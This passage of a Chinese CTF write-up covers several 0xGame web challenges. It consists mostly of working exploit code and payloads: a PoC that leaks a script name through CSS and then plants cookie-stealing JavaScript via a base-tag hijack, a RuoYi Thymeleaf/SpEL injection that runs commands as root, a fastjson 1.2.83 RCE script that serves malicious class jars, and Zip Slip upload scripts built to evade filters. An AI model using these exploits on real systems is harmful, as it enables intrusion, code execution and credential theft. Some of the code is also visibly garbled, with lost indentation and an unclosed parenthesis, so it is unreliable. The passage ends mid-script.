- 脚本标签上的 `nonce` 是服务器渲染的，我们没有改它，它也仍然和 bot 页面自己那份 CSP 里的 `nonce-...` 一致（nonce 每次响应随机；4.1 里的是我们访问公开页那次的值，4.8 diag 里的是 bot 那次的值，两者不需要相等，能执行就说明匹配）；
- CSP 的 nonce-source 校验的是**脚本元素**，不是 URL。只要元素带着正确的 nonce，即使 `src` 被 base 改到了 `/uploads/...`，它也照样放行；
- 上传目录和页面同源（机器人从 `http://127.0.0.1` 访问），所以 `default-src 'self'`、`img-src 'self'` 也都满足；
- 我们注入的 `<script>` 和内联事件处理器会被 CSP 拦，但我们根本没有注入脚本——我们只是改了一个相对 URL 的基准，执行的仍然是服务器自己渲染的那个带 nonce 的脚本标签。

换句话说，CSP 防的是“我们引入新的脚本”，而这题被利用的是“服务器自己的脚本标签被换了个地址”。

### 4.8 再触发一次，读回执拿 flag

回到管理页，点「请求机器人预览公开页」，然后点「查看访问回执」。实测回执里出现：

```
2026-10-20 13:17:36Z | diag |
base=http%3A%2F%2F127.0.0.1%2Fuploads%2Ff6d53f6b%2F
|src=http%3A%2F%2F127.0.0.1%2Fuploads%2Ff6d53f6b%2Freview-9e9e63.js
|nonce=qz1DlFoxSKklAE1L
|cookie=flag%3D0xGame%7B5535cb58-95f8-4390-94ce-90c4b2519430%7D
```

最终 flag：

```
0xGame{5535cb58-95f8-4390-94ce-90c4b2519430}
```
### 4.9 一键 PoC

把下面的脚本保存成 `reviewhub_revenge.py`，运行时传入题目地址即可。逻辑和上面手点的步骤完全一致：建板 → 逐位泄漏 → 等值校验 → 上传同名 JS → 注入 base → 触发审核 → 从回执里取 flag。

```python
import urllib.request, urllib.parse, http.cookiejar, re, gzip, time, html, sys

BASE = (sys.argv[1].rstrip("/") if len(sys.argv) > 1
        else "http://80-94e1d51f-80d8-4fbe-933a-fd2c7b4c2f19.challenge.ctfplus.cn")
HEX = "0123456789abcdef"

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
op.addheaders = [("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")]

def rd(r):
    b = r.read()
    if r.headers.get("Content-Encoding") == "gzip":
        b = gzip.decompress(b)
    return b.decode("utf-8", "replace")

def open1(req, retry=30):
    for _ in range(retry):
        try:
            r = op.open(req, timeout=30)
            return r.status, dict(r.headers), rd(r)
        except urllib.error.HTTPError as e:
            b = e.read().decode("utf-8", "replace")
            if len(b) < 80 and e.code >= 500:   # 平台偶发 502 空响应，重试
                time.sleep(0.4)
                continue
            return e.code, dict(e.headers), b
        except Exception:
            time.sleep(0.4)
    return -1, {}, ""

def get(p):
    return open1(urllib.request.Request(BASE + p))

def post(p, d):
    return open1(urllib.request.Request(BASE + p,
                 data=urllib.parse.urlencode(d).encode()))

get("/")
_, _, b = post("/create", {"title": "wp", "body": "hi",
                           "head_snippet": "<style></style>"})
SLUG = re.search(r'/manage/([0-9a-f]{8})', b).group(1)
TOKEN = re.search(r'token=([0-9a-f]{32})', b).group(1)
print("[*] slug=%s token=%s" % (SLUG, TOKEN))

def update(s):
    post("/manage/%s/update" % SLUG,
         {"token": TOKEN, "title": "wp", "body": "hi", "head_snippet": s})

def report():
    post("/manage/%s/report" % SLUG, {"token": TOKEN})

def logs():
    _, _, b = get("/logs?slug=%s&token=%s" % (SLUG, TOKEN))
    rows = []
    for tr in re.findall(r'<tr>(.*?)</tr>', b, re.S):
        tds = re.findall(r'<td[^>]*>(.*?)</td>', tr, re.S)
        if len(tds) >= 3:
            rows.append([html.unescape(re.sub(r'<[^>]+>', '', c)).strip()
                         for c in tds])
    return rows

def kinds():
    return set(r[1] for r in logs() if len(r) >= 2)

def wait_kind(k, timeout=150):
    t0 = time.time()
    while time.time() - t0 < timeout:
        if k in kinds():
            return True
        time.sleep(2)
    return False

def leak_round(prefix, idx):
    """返回下一位字符；base 出现但没有候选时自动重试。"""
    for attempt in range(1, 4):
        run = "p%d_%d" % (idx, attempt)
        css = ('<style>html{background-image:url("/collect/%s?kind=%s_base&value=1")}'
               % (SLUG, run))
        for c in HEX:
            css += ('body:has(input[name="review-script"][value^="%s%s"])'
                    '{background-image:url("/collect/%s?kind=%s_%s&value=1")}'
                    % (prefix, c, SLUG, run, c))
        css += "</style>"
        update(css)
        report()
        if not wait_kind(run + "_base"):
            print("[!] %s 没有活体回执，重试" % run)
            continue
        time.sleep(1.5)
        present = kinds()
        hit = [c for c in HEX if ("%s_%s" % (run, c)) in present]
        if len(hit) == 1:
            return hit[0]
        print("[!] %s 候选命中数=%d，重试" % (run, len(hit)))
    return None

prefix = "review-"
for i in range(6):
    c = leak_round(prefix, i)
    if c is None:
        print("[!] 第 %d 位泄漏失败，请重试" % i)
        sys.exit(1)
    prefix += c
    print("[+] 第 %d 位 -> %s，当前前缀 %s" % (i, c, prefix))

name = prefix + ".js"
print("[*] 审核脚本名: %s" % name)

# 等值校验：确认完整文件名
eq_run = "eq%d" % int(time.time())
css = ('<style>html{background-image:url("/collect/%s?kind=%s_base&value=1")}'
       'body:has(input[name="review-script"][value="%s"])'
       '{background-image:url("/collect/%s?kind=%s_eq&value=1")}</style>'
       % (SLUG, eq_run, name, SLUG, eq_run))
update(css); report()
if not wait_kind(eq_run + "_eq", 120):
    print("[!] 等值校验未命中，但继续尝试")
else:
    print("[+] 等值校验通过")

# 上传同名恶意 JS
js = ("(function(){try{var c=document.cookie;"
      "var s=(document.scripts&&document.scripts[0])||{};"
      "var d='base='+encodeURIComponent(document.baseURI)"
      "+'|src='+encodeURIComponent(s.src||'')"
      "+'|nonce='+encodeURIComponent(s.nonce||'')"
      "+'|cookie='+encodeURIComponent(c);"
      "new Image().src='/collect/%s?kind=diag&value='+encodeURIComponent(d);"
      "}catch(e){new Image().src='/collect/%s?kind=err&value='+encodeURIComponent(String(e));}})();"
      % (SLUG, SLUG))
post("/manage/%s/asset" % SLUG,
     {"token": TOKEN, "filename": name, "content": js})
print("[*] 已上传 %s" % name)

# 注入 base，触发审核
update('<style>body{}</style><base href="/uploads/%s/">' % SLUG)
report()

t0 = time.time()
while time.time() - t0 < 180:
    for r in logs():
        if len(r) >= 3 and r[1] in ("diag", "err"):
            print("[+] 回执:", r[2])
            v = urllib.parse.unquote(r[2])
            m = re.search(r'flag=(0xGame\{[^}]+\})', v)
            print("[+] FLAG:", m.group(1) if m else "未匹配到 flag")
            raise SystemExit
    time.sleep(2)
print("[!] 超时，未收到 diag/err 回执")
```

## 5、！？SPEL？！
这实际上是一个RuoYi的漏洞（RuoYi4.8.1 Thymeleaf漏洞），是一个需要登录后台才能利用的服务器端模板注入（SSTI）漏洞。由于该版本使用了 Thymeleaf 3.0.15，其内置的安全检查可以用特定的语法格式绕过，最终导致远程代码执行。
#### 5.1 漏洞位置与前提
漏洞点位于 `CacheController` 的 `/monitor/cache/getNames` 接口。该接口的 `fragment` 参数被直接拼接到视图路径中返回，没有做充分的过滤。
**利用前提**：攻击者需要拥有有效的后台登录会话，且账号具备 `monitor:cache:view` 权限。
而`fragment` 参数并非在系统页面的某个表单或输入框中填写，而是通过 HTTP 请求直接发送给后端接口的。它位于 RuoYi 后台 `CacheController` 的 `/monitor/cache/getNames` 接口请求中。
#### 5.2 复现过程
先拿到后台管理的账号和密码，通过简单的弱口令爆破拿到
```
账号：admin
密码：admin123
```
成功登录到管理员后台，我们可以在系统监控-->缓存监控得到`/monitor/cache`的接口，抓包后可以构造所需的请求包来做个探测
```
POST /monitor/cache/getNames HTTP/1.1
Host: 8080-525829a9-1887-4079-b27d-49bcbc9e5fa2.challenge.ctfplus.cn
Cookie: _ga_BFDVYZJ3DE=GS2.1.s1792508059$o37$g1$t1792508120$j60$l0$h0; _ga=GA1.1.242289672.1779001013; _clck=1q7gq3l%5E2%5Egag%5E0%5E2328; _clsk=guto73%5E1792508121141%5E8%5E1%5Eh.clarity.ms%2Fcollect; JSESSIONID=9a0975f8-c209-4656-ae9b-fefe0234dc48
Content-Length: 59
Content-Type: application/x-www-form-urlencoded

fragment=__|$${#response.getWriter().print('111')}|__::.x
```
响应包
```
HTTP/1.1 200 OK
Content-Language: zh-CN
Content-Type: text/html;charset=ISO-8859-1
Date: Tue, 20 Oct 2026 15:10:21 GMT
Content-Length: 3

111
```
成功绕过，接下来读取flag
```
POST /monitor/cache/getNames HTTP/1.1
Host: 8080-525829a9-1887-4079-b27d-49bcbc9e5fa2.challenge.ctfplus.cn
Cookie: _ga_BFDVYZJ3DE=GS2.1.s1792508059$o37$g1$t1792508120$j60$l0$h0; _ga=GA1.1.242289672.1779001013; _clck=1q7gq3l%5E2%5Egag%5E0%5E2328; _clsk=guto73%5E1792508121141%5E8%5E1%5Eh.clarity.ms%2Fcollect; JSESSIONID=9a0975f8-c209-4656-ae9b-fefe0234dc48
Content-Length: 398
Content-Type: application/x-www-form-urlencoded

fragment=__|$${#response.getWriter().print(@securityManager.getClass().getClassLoader().loadClass('java.lang.Runtime').getMethods.?[name=='getRuntime'][0].invoke(null).getClass.getMethods.?[name=='exec'][2].invoke(@securityManager.getClass().getClassLoader().loadClass('java.lang.Runtime').getMethods.?[name=='getRuntime'][0].invoke(null),'cat /flag',null).inputReader().lines().toList())}|__::.x
```
响应包
```
HTTP/1.1 200 OK
Content-Language: zh-CN
Content-Type: text/html;charset=ISO-8859-1
Date: Tue, 20 Oct 2026 15:13:49 GMT
Content-Length: 46

[0xGame{0339e747-1ea1-454d-af1a-29933e9fa410}]
```

#### 5.3 RCE链构造过程
`@securityManager` 是 Shiro 的 Bean，先确认它存在，再一步步延长链，每一步用 `print` 回显结果：
```spel
# 1. Bean 存在？

@securityManager
# → org.apache.shiro.web.mgt.DefaultWebSecurityManager@6574b6b1

# 2. 拿类加载器
@securityManager.getClass().getClassLoader()
# → org.springframework.boot.loader.LaunchedURLClassLoader@2d8e6db6

# 3. 加载 Runtime 类
@securityManager.getClass().getClassLoader().loadClass('java.lang.Runtime')
# → class java.lang.Runtime

# 4. 反射取 getRuntime 方法
@securityManager.getClass().getClassLoader().loadClass('java.lang.Runtime').getMethods.?[name=='getRuntime'][0]
# → public static java.lang.Runtime java.lang.Runtime.getRuntime()


# 5. 调用 getRuntime()，拿到 Runtime 实例
@securityManager.getClass().getClassLoader().loadClass('java.lang.Runtime').getMethods.?[name=='getRuntime'][0].invoke(null)
# → java.lang.Runtime@8cba2d4
```
几个关键写法（这是绕过"监测机制"的要点）：
- `getMethods` 不写括号（`getMethods` 等价 `getMethods()`）；
- 用 `.?[name=='getRuntime'][0]`（SpEL 集合选择 + 下标）替代 `getMethod('getRuntime')`，避免 `getMethod` 被额外拦截；
- `invoke(null)` 调用静态方法。

`Runtime` 有 6 个 `exec` 重载，`getMethods()` 返回的顺序**随 JDK 版本不同而变**。我们要用的是 `exec(String, String[])`（传 `命令 + null`）。逐个试下标，看哪个返回 `Process` 对象：
```spel
# exec 位置 i = 0..5
...getClass.getMethods.?[name=='exec'][i].invoke(<Runtime实例>, 'id', null)
```
实测 **Java 17 下 `exec[2]` 命中**，返回 `Process[pid=496, exitValue=0]`（`exitValue=0` 表示命令执行成功）。其余下标 500 报错。
`exec()` 返回 `Process`，直接 `getInputStream()` 会 500（被检测），但反射调用就能过；更简单的是 Java 9+ 的 `Process.inputReader()`：
```spel
(<Process>).inputReader().lines().toList()
```
实测 `id` 命令输出 `[uid=0(root) gid=0(root) groups=0(root)]` —— **root 权限**。
#### 5.4 一键PoC
```python
import urllib.request, urllib.parse, http.cookiejar, gzip, time, sys
BASE = "http://8080-255b6fd7-791a-46dd-a81f-e9ee0aa2f2ec.challenge.ctfplus.cn"
CMD = sys.argv[1] if len(sys.argv) > 1 else "cat /flag"
cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
op.addheaders = [("User-Agent", "Mozilla/5.0")]
def rd(r):
    b = r.read()
    if r.headers.get("Content-Encoding") == "gzip":
        b = gzip.decompress(b
    return b.decode("utf-8", "replace")
def open1(req, retry=5, timeout=30):
    for _ in range(retry):
        try:
            r= op.open(req, timeout=30)
            return r.status, rd(r)
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode("utf-8", "replace")
        except Exception:
            time.sleep(0.2); continue
    return -1, "[EXC]"
def post(path, data):
    return open1(urllib.request.Request(BASE + path, data=urllib.parse.urlencode(data).encode()))
post("/login", {"username": "admin", "password": "admin123", "rememberMe": "true"})
LDR = "@securityManager.getClass().getClassLoader()"
RT = "%s.loadClass('java.lang.Runtime').getMethods.?[name=='getRuntime'][0].invoke(null)" % LDR
def rce(cmd, idx=2):
    P = "%s.getClass.getMethods.?[name=='exec'][%d].invoke(%s,'%s',null)" % (RT, idx, RT, cmd)
    frag = "__|$${#response.getWriter().print((%s).inputReader().lines().toList())}|__::.x" % P
    st, b = post("/monitor/cache/getNames", {"fragment": frag})
    return st, b
st, b = rce(CMD)
print(b)
```

## 6、让我解解你的json......不耗！
其实就是参考的fastjson 1.2.83 rce出的，具体可以参考：`https://arknight.wiki/index.php/2026/08/03/fastjson-1-2-83-rce-%e5%a4%8d%e7%8e%b0/`
```python
import argparse
import json
import os
import re
import struct
import sys
import threading
import urllib.request
import zipfile
from functools import partial
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer
FLAG_RE = re.compile(r"0xGame\{[^}]*\}|flag\{[^}]*\}")
class Pool:
def __init__(self):
self.tags = []
self.data = []
self.cache = {}
self.next = 1
def _add(self, key, tag, payload):
if key in self.cache:
return self.cache[key]
idx = self.next
self.next += 1
self.cache[key] = idx
self.tags.append(tag)
self.data.append(payload)
return idx
def utf8(self, s):
b = s.encode("utf-8")
return self._add(("u", s), 1, struct.pack(">H", len(b)) + b)
def cls(self, name):
return self._add(("c", name), 7, struct.pack(">H", self.utf8(name)))
def string(self, s):
return self._add(("s", s), 8, struct.pack(">H", self.utf8(s)))
def nat(self, n, d):
return self._add(("n", n, d), 12,
struct.pack(">HH", self.utf8(n), self.utf8(d)))
def methodref(self, c, n, d):
return self._add(("m", c, n, d), 10,
struct.pack(">HH", self.cls(c), self.nat(n, d)))
def dump(self):
out = bytearray(struct.pack(">H", self.next))
for tag, payload in zip(self.tags, self.data):
out.append(tag)
out += payload
return bytes(out)
def code_attr(name, stack, locals_, code):
body = struct.pack(">HHI", stack, locals_, len(code)) + code +
struct.pack(">HH", 0, 0)
return struct.pack(">HI", name, len(body)) + body
def make_class(internal, flag_path):
p = Pool()
obj = p.cls("java/lang/Object")
this = p.cls(internal)
jstr = p.cls("java/lang/String")
paths_get = p.methodref("java/nio/file/Paths", "get",
"(Ljava/lang/String;
[Ljava/lang/String;)Ljava/nio/file/Path;")
read_all = p.methodref("java/nio/file/Files", "readAllBytes", "
(Ljava/nio/file/Path;)[B")
str_init = p.methodref("java/lang/String", "<init>", "([B)
V")
trim = p.methodref("java/lang/String", "trim", "()Ljava/lang/String;")
obj_init = p.methodref("java/lang/Object", "<init>", "()V")
getflag = p.methodref(internal, "getFlag", "()Ljava/lang/String;")
code_name = p.utf8("Code")
rva_name = p.utf8("RuntimeVisibleAnnotations")
json_type = p.utf8("Lcom/alibaba/fastjson/annotation/JSONType;")
flag_const = p.string(flag_path)
getter = (b"\x12" + bytes([flag_const]) + b"\x03"
+ b"\xbd" + struct.pack(">H", jstr)
+ b"\xb8" + struct.pack(">H", paths_get)
+ b"\xb8" + struct.pack(">H", read_all)
+ b"\x4c"
+ b"\xbb" + struct.pack(">H", jstr)
+ b"\x59" + b"\x2b"
+ b"\xb7" + struct.pack(">H", str_init)
+ b"\xb6" + struct.pack(">H", trim)
+ b"\xb0")
def method(flags, name, desc, code, stack, locals_):
return (struct.pack(">HHHH", flags, p.utf8(name), p.utf8(desc), 1)
+ code_attr(code_name, stack, locals_, code))
methods = b""
methods += method(0x0001, "<init>", "()V",
b"\x2a\xb7" + struct.pack(">H", obj_init) + b"\xb1", 1,
1)
methods += method(0x0001, "getFlag", "()Ljava/lang/String;", getter, 3, 2)
methods += method(0x0001, "getValue", "()Ljava/lang/String;", getter, 3, 2)
methods += method(0x0001, "toString", "()Ljava/lang/String;",
b"\x2a\xb6" + struct.pack(">H", getflag) + b"\xb0", 1, 1)
head = struct.pack(">IHH", 0xCAFEBABE, 0, 52) + p.dump()
body = struct.pack(">HHHHHH", 0x0021, this, obj, 0, 0, 4) + methods
rva = struct.pack(">HI", rva_name, 6) + struct.pack(">HHH", 1, json_type,
0)
return head + body + struct.pack(">H", 1) + rva
def build_jar(path, flag_path, start, end):
with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
for n in range(start, end + 1):
pkg = "fd%02d" % n
internal = "jar:file:/proc/self/fd/%d!/%s/Exception" % (n, pkg)
info = zipfile.ZipInfo("%s/Exception.class" % pkg, (1980, 1, 1, 0,0, 0))
info.compress_type = zipfile.ZIP_DEFLATED
z.writestr(info, make_class(internal, flag_path))
class QuietHandler(SimpleHTTPRequestHandler):
verbose = False
def log_message(self, fmt, *args):
if self.verbose:
sys.stderr.write("[serve] %s %s\n" % (self.address_string(), fmt %args))
class JarServer(threading.Thread):
def __init__(self, directory, port):
super().__init__(daemon=True)
handler = partial(QuietHandler, directory=directory)
self.httpd = ThreadingHTTPServer(("0.0.0.0", port), handler)
def run(self):
self.httpd.serve_forever()
def stop(self):
self.httpd.shutdown()
self.httpd.server_close()
def build_payload(hostint, port, start, end):
arr = [{"@type": "jar:http:..%s:%s.fd!.fd%02d.Exception" % (hostint, port,
start)}]
for n in range(start, end + 1):
arr.append({"@type": "jar:file:.proc.self.fd.%d!.fd%02d.Exception" %
(n, n)})
return json.dumps(arr, separators=(",", ":")).encode("utf-8")
def main():
ap = argparse.ArgumentParser(description="fastjson 1.2.83 /proc/self/fd
exploit")
ap.add_argument("target", help="⽬标地址，如 http://8080-
xxxx.challenge.ctfplus.cn")
ap.add_argument("hostint", nargs="?", default="796270110", help="托管 jar 的
整数 IP")
ap.add_argument("port", nargs="?", type=int, default=9999, help="托管端⼝")
ap.add_argument("flagpath", nargs="?", default="/flag", help="⽬标上的 flag
路径")
ap.add_argument("--fd-start", type=int, default=3)
ap.add_argument("--fd-end", type=int, default=100)
ap.add_argument("--timeout", type=float, default=60.0)
ap.add_argument("--verbose", action="store_true", help="打印每次 HTTP 请求")
ap.add_argument("--dir",
default=os.path.join(os.path.dirname(os.path.abspath(__file__)), "work"))
args = ap.parse_args()
QuietHandler.verbose = args.verbose
os.makedirs(args.dir, exist_ok=True)
jar_path = os.path.join(args.dir, "fd")
print("[1/3] ⽣成 payload jar -> %s" % jar_path)
build_jar(jar_path, args.flagpath, args.fd_start, args.fd_end)
print(" classes=%d range=%d..%d flagPath=%s"
% (args.fd_end - args.fd_start + 1, args.fd_start, args.fd_end,
args.flagpath))
print("[2/3] 启动托管 0.0.0.0:%d (dir=%s)" % (args.port, args.dir))
try:
server = JarServer(args.dir, args.port)
except OSError as exc:
print("[-] 端⼝ %d 绑定失败: %s（先停掉占⽤进程，或⽤ --port 换端⼝）"
% (args.port, exc))
return 2
server.start()
target = args.target.rstrip("/")
url = target + "/api/parse"
body = build_payload(args.hostint, args.port, args.fd_start, args.fd_end)
print("[3/3] POST %s （jar host = %s:%d）" % (url, args.hostint, args.port))
try:
req = urllib.request.Request(url, data=body,
headers={"Content-Type":
"application/json"})
with urllib.request.urlopen(req, timeout=args.timeout) as resp:
text = resp.read().decode("utf-8", "replace")
code = resp.status
finally:
server.stop()
m = FLAG_RE.search(text)
if m:
print("[+] FLAG = %s" % m.group(0))
return 0
print("[-] 没拿到 flag（http=%s，响应 %d 字节）" % (code, len(text)))
print("[-] 响应⽚段: %s" % text[:200].replace("\n", " "))
return 1
if __name__ == "__main__":
sys.exit(main())
#!/usr/bin/env bash
set -euo pipefail
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
exec python3 "$DIR/pwn.py" "$@"
```

## 7、文件上传的千层套路

看题目就能知道这是一道文件上传的题目

![](/images/20261022130722_10.png)

先上传一个正常的zip文件尝尝鲜

![](/images/20261022130722_11.png)

非常性情啊，直接告诉了我们后缀的白名单
```
png/jpg/jpeg/gif/bmp
```

说明上传.zip后他会自动解压，然后接纳里面的文件，zip 不校验它是不是合法路径，也不管你里面是否真实存在这个文件。这样的文件就叫`entry name（条目名）`是一串纯文本。
**执行逻辑**：
```php
file_put_contents($解压目录 . '/' . $条目名, $内容);
```
把「解压目录」和「条目名」**直接拼起来**。这道题的解压目录是：
```
/var/www/html/uploads/x.zip/
```
例如：

| 条目名                    | 拼接结果                                               | 实际落盘                                        |
| ---------------------- | -------------------------------------------------- | ------------------------------------------- |
| hello.png              | /var/www/html/uploads/x.zip/hello.png              | 在解压目录里，正常                                   |
| ../../../pub/hello.png | /var/www/html/uploads/x.zip/../../../pub/hello.png | **归一化后 = `/var/www/pub/hello.png`**，跳出解压目录了 |

这就是 **Zip Slip（压缩包路径穿越）**：因为拼接后没有做 `realpath` 归一化校验，`../` 把落点带到了别的目录。
先尝试上传一个love.png（内容空）的zip
结果返回
```
解压目录: /var/www/html/uploads/love.zip  
love.png => 拒绝(幻术头不符: .png 需要对应的图片文件头)
```
所以要加上`\x89PNG\r\n\x1a\n`伪装.png
这里给一个可以生成对应条目名的脚本
```python
import os, zipfile  
  
PNG_SIG = b"\x89PNG\r\n\x1a\n"  
  
src = input("源文件地址: ").strip('"').strip("'")  
name = input("条目名: ").strip() or os.path.basename(src)  
name = name.replace("\\", "/").lstrip("/")  
dst = os.path.join(os.path.expanduser("~"), "Desktop", "output.zip")  
  
with open(src, "rb") as f:  
    data = f.read()  
  
if name.lower().endswith(".png"):  
    data = PNG_SIG + data  
  
with zipfile.ZipFile(dst, "w") as z:  
    z.writestr(name, data)  
  
print("完成:", dst, "->", name)  
input("按回车退出")
```
自己先生成一个空的.zip再用这个脚本添加条目名
这次上传后回显
```
解压目录: /var/www/html/uploads/output.zip  
love.png => 拒绝(内容仅允许可见字符)
```
说明不能带 `\x00`（魔数只取 8 字节，别补 `\x00`），改进代码
```python
import os, zipfile

PNG_SIG = b"\x89PNG\r\n\x1a\n"   # 正好 8 字节，无 \x00

src = input("源文件的地址: ").strip('"').strip("'")
name = input("条目名: ").strip() or os.path.basename(src)
name = name.replace("\\", "/").lstrip("/")
dst = os.path.join(os.path.expanduser("~"), "Desktop", "output.zip")

with open(src, "rb") as f:
    data = f.read()

# 可选：去掉源文件内容里所有的 \x00
strip_null = input("是否去掉源文件中的 \\x00？(y/N): ").strip().lower()
if strip_null == "y":
    before = len(data)
    data = data.replace(b"\x00", b"")
    print(f"已去除 {before - len(data)} 个 \\x00 字节")

# 若条目名以 .png 结尾，前置 8 字节 PNG 签名（不补 \x00）
if name.lower().endswith(".png"):
    data = PNG_SIG + data

with zipfile.ZipFile(dst, "w") as z:
    with z.open(name, "w") as w:
        w.write(data)

print("完成:", dst, "->", name)
print("写入前 8 字节:", data[:8])
```
这次上传后，回显
```
解压目录: /var/www/html/uploads/output.zip  
../../../pub/love.png => 拒绝(内容仅允许可见字符)
```
这是因为.zip本身就携带很多\x00，这个也是拦的，继续改进脚本
```python
import os  
import zipfile  
  
PNG_SIG = b"\x89PNG\r\n\x1a\n"  
ALLOWED_EXT = {"png", "jpg", "jpeg", "gif", "bmp"}  
TRAVERSE = "../../../pub/"  
  
  
def clean_visible(data):  
    """只保留 ASCII 可见字符(0x20-0x7E) + LF(0A)/CR(0D)，其余全删。  
    不保留 Tab(09)：服务端是否放行未知，删掉最保险（PHP 代码缩进用空格即可）。"""  
    return bytes(b for b in data if 0x20 <= b <= 0x7E or b in (0x0A, 0x0D))  
  
  
def main():  
    # ---------- 1. 源文件 ----------    src = input("源文件路径: ").strip().strip('"').strip("'")  
    if not os.path.isfile(src):  
        print("[错误] 文件不存在:", src)  
        return  
    with open(src, "rb") as f:  
        data = f.read()  
  
    # ---------- 2. 条目名 ----------    base = os.path.basename(src)  
    name = input("条目名（回车用 %s）: " % (TRAVERSE + base)).strip() or (TRAVERSE + base)  
    name = name.replace("\\", "/").lstrip("/")  
    if not name.startswith("../"):  
        name = TRAVERSE + name  
        print("[提示] 已自动补穿越前缀 -> %s" % name)  
  
    # ---------- 3. 后缀 ----------    leaf = name.rsplit("/", 1)[-1]  
    ext = leaf.rsplit(".", 1)[-1].lower() if "." in leaf else ""  
    dot_only = leaf.startswith(".") and leaf.count(".") == 1  
    if not dot_only and ext not in ALLOWED_EXT:  
        print("[警告] 后缀 '%s' 不在白名单，可能被拒。想用 PHP 就写成 xxx.php.png" % ext)  
  
    # ---------- 4. 内容清洗（核心修复）----------  
    print()  
    if data.startswith(PNG_SIG):  
        data = data[8:]  
        print("[提示] 源文件自带 PNG 魔数，已剥离（避免重复叠加）")  
  
    before = len(data)  
    data = clean_visible(data)  
    removed = before - len(data)  
  
    if removed:  
        ratio = (removed / before) if before else 0  
        print("[清洗] 删除 %d 个非可见字节（含 \\x00 及所有控制字符）" % removed)  
        if ratio > 0.3:  
            print("[警告] 删除比例 %.0f%%，源文件应该是二进制（zip/图片/可执行文件）" % (ratio * 100))  
            print("       清洗后内容已严重损坏，只剩可见字符残渣，不再是原文件。")  
            print("       本脚本只适合【纯文本源文件】，比如一个只写 PHP 代码的 txt。")  
            if input("       仍要继续？(y/N): ").strip().lower() != "y":  
                return  
    else:  
        print("[OK] 源文件本身全是可见字符，无需清洗")  
  
    # ---------- 5. 加 PNG 魔数 ----------    data = PNG_SIG + data  
    print("[OK] 已前置 8 字节 PNG 魔数")  
  
    # ---------- 6. 写 zip ----------    dst = os.path.join(os.path.expanduser("~"), "Desktop", "output.zip")  
    with zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED) as z:  
        z.writestr(name, data)  
  
    # ---------- 7. 自检 ----------    print()  
    print("完成:", dst)  
    print("条目名:", name)  
    print("长度:", len(data), "| \\x00:", data.count(0))  
    print("前16字节:", " ".join("%02X" % b for b in data[:16]))  
  
    ctrl = sorted(set(b for b in data if b < 0x20))  
    print("剩余控制字符:", ctrl, "（理想情况只有 10, 13, 26）")  
  
    checks = [  
        ("穿越", name.startswith("../")),  
        ("后缀", dot_only or ext in ALLOWED_EXT),  
        ("幻术头", data.startswith(PNG_SIG)),  
        ("无\\x00", data.count(0) == 0),  
        ("无多余控制符", all(b in (0x0A, 0x0D, 0x1A) for b in ctrl)),  
    ]  
    print("自检:", " ".join("%s%s" % ("√" if ok else "×", k) for k, ok in checks))  
  
  
if __name__ == "__main__":  
    main()
```
这次回显的是
```
解压目录: /var/www/html/uploads/output.zip  
../../../pub/love.png => 拒绝(变量 $ 不允许)
```
继续改进脚本来解决拒绝(变量 $ 不允许)的问题，其实还有反引号的问题，直接一步到位
```python
import os, re, zipfile  
  
PNG_SIG = b"\x89PNG\r\n\x1a\n"  
ALLOWED_EXT = {"png", "jpg", "jpeg", "gif", "bmp"}  
KEYWORDS = [b"system", b"exec", b"passthru", b"shell_exec", b"file_get_contents"]  
  
  
def main():  
    src = input("源文件路径: ").strip().strip('"').strip("'")  
    if not os.path.isfile(src):  
        print("[错误] 文件不存在:", src)  
        return  
    with open(src, "rb") as f:  
        data = f.read()  
  
    # 条目名：只保留纯文件名，强制无穿越  
    base = os.path.basename(src)  
    raw = input("条目名（回车用 %s）: " % base).strip() or base  
    name = raw.replace("\\", "/").rsplit("/", 1)[-1].lstrip(".")  
    if not name:  
        print("[错误] 条目名为空")  
        return  
    if name != raw:  
        print("[提示] 已强制去掉目录/穿越 ->", name)  
  
    leaf = name  
    ext = leaf.rsplit(".", 1)[-1].lower() if "." in leaf else ""  
    dot_only = leaf.startswith(".") and leaf.count(".") == 1  
    if not dot_only and ext not in ALLOWED_EXT:  
        print("[警告] 后缀 '%s' 不在白名单，可能被拒" % ext)  
  
    # 内容清洗：强制去 \x00、$、反引号、关键字  
    if data.startswith(PNG_SIG):  
        data = data[8:]  
    data = bytes(b for b in data if 0x20 <= b <= 0x7E or b in (0x0A, 0x0D))  
    data = data.replace(b"$", b"").replace(b"`", b"")  
    for kw in KEYWORDS:  
        data = re.sub(re.escape(kw), b"", data, flags=re.I)  
    data = PNG_SIG + data  
  
    dst = os.path.join(os.path.expanduser("~"), "Desktop", "output.zip")  
    with zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED) as z:  
        z.writestr(name, data)  
  
    body = data[8:]  
    ctrl = {b for b in data if b < 0x20} - {0x0A, 0x0D, 0x1A}  
    checks = [  
        ("无穿越", "/" not in name and "\\" not in name and not name.startswith("..")),  
        ("后缀", dot_only or ext in ALLOWED_EXT),  
        ("幻术头", data.startswith(PNG_SIG)),  
        ("无\\x00", 0 not in data),  
        ("无控制符", not ctrl),  
        ("无$", 0x24 not in body),  
        ("无反引号", 0x60 not in body),  
        ("无关键字", not any(k in body.lower() for k in KEYWORDS)),  
    ]  
    print("\n完成:", dst)  
    print("条目名:", name, "| 长度:", len(data))  
    print("前16字节:", " ".join("%02X" % b for b in data[:16]))  
    print("正文:", repr(body))  
    print("自检:", " ".join(("√" if ok else "×") + k for k, ok in checks))  
  
  
if __name__ == "__main__":  
    main()
```
这次回显
```
解压目录: /var/www/html/uploads/output.zip  
love.png => 已解压
```
成功解压，我们访问`/uploads/output.zip/love.png`，结果是拒绝访问的
![](/images/20261022130722_12.png)
这是因为只能访问/var/www/pub 目录。所以我们尝试一下目录穿越，脚本如下
```python
import os, re, zipfile  
  
PNG_SIG = b"\x89PNG\r\n\x1a\n"  
ALLOWED_EXT = {"png", "jpg", "jpeg", "gif", "bmp"}  
TRAVERSE = "../../../pub/"  
KEYWORDS = [b"system", b"exec", b"passthru", b"shell_exec", b"file_get_contents"]  
  
  
def clean(data, level):  
